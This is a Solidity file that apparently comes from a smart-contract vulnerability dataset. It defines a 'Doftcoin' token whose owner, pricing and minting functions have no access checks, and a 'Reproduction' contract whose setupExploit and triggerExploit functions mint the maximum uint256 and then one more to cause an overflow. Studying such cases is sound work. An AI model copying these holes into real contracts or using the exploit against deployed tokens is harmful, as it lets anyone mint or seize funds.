// pragma solidity ^0.8.18;
contract owned {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function transferOwnership(address newOwner) public {
        owner = newOwner;
    }
}

contract doftManaged {
    address public doftManager;

    constructor() public {
        doftManager = msg.sender;
    }

    function transferDoftManagment(address newDoftManager) public {
        doftManager = newDoftManager;
    }
}

abstract contract ERC20 {
    function balanceOf(
        address _owner
    ) external view virtual returns (uint balance);
    function transfer(
        address _to,
        uint _value
    ) public virtual returns (bool success);
}

contract BasicToken is ERC20 {
    uint256 _totalSupply;

    mapping(address => uint256) public override balanceOf;
    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != address(0)); // Prevent transfer to 0x0 address. Use burn() instead
        require(balanceOf[_from] > _value); // Check if the sender has enough

        balanceOf[_from] -= _value; // Subtract from the sender
        balanceOf[_to] += _value; // Add the same to the recipient
    }

    function transfer(
        address _to,
        uint _value
    ) public override returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
}

contract Doftcoin is BasicToken {
    string public name;
    string public symbol;
    uint256 public decimals;
    uint256 public sellPrice;
    uint256 public buyPrice;
    uint256 public miningStorage;
    string public version;

    function setbalanceOf() public {
        balanceOf[msg.sender] = _totalSupply;
        decimals = 18;
        _totalSupply = 5000000 * (10 ** 18); // Update total supply
        miningStorage = _totalSupply / 2;
        name = "Doftcoin"; // Set the name for display purposes
        symbol = "DFC"; // Set the symbol for display purposes
        version = "1.0";
    }

    /// @notice Buy tokens from contract by sending ether
    function buy() public payable {
        require(buyPrice > 0);
        uint amount = msg.value / buyPrice; // calculates the amount
    }

    /// @notice Sell `_amount` tokens to contract
    /// @param _amount Amount of tokens to be sold
    function sell(uint256 _amount) public {
        require(sellPrice > 0);
        _transfer(msg.sender, address(this), _amount); // makes the transfers
        payable(msg.sender).transfer(_amount * sellPrice); // sends ether to the seller. It's important to do this last to avoid recursion attacks
    }

    function setPrices(uint256 _newSellPrice, uint256 _newBuyPrice) public {
        sellPrice = _newSellPrice;
        buyPrice = _newBuyPrice;
    }

    function mintToken(address _target, uint256 _mintedAmount) public {
        balanceOf[msg.sender] = _totalSupply;
        uint balanceOf_target = balanceOf[_target];
        balanceOf_target += _mintedAmount;
        balanceOf[_target] = balanceOf_target;
    }
}

contract Reproduction {
    Doftcoin public vulnerableContract;
    address public attacker;

    constructor(address _vulnerableContract) {
        vulnerableContract = Doftcoin(_vulnerableContract);
    }
    function setupExploit(address _target) public {
        uint256 maxUint = type(uint256).max;
        vulnerableContract.mintToken(_target, maxUint);
    }
    function triggerExploit() public {
        vulnerableContract.mintToken(attacker, 1);
    }
    function checkBalance(address _target) public view returns (uint256) {
        return vulnerableContract.balanceOf(_target);
    }
}
